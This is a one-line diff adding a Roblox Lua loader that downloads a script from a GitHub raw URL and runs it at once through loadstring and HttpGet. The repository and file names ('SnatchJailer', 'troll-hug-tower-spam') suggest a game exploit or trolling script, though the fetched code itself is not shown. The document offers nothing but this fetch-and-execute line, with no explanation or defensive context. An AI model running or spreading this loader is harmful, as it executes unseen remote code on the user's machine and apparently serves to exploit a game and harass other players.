@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/SnatchJailer/loaders/main/loaders/troll-hug-tower-spam7-xkkuucy4gtq4x3.lua"))()
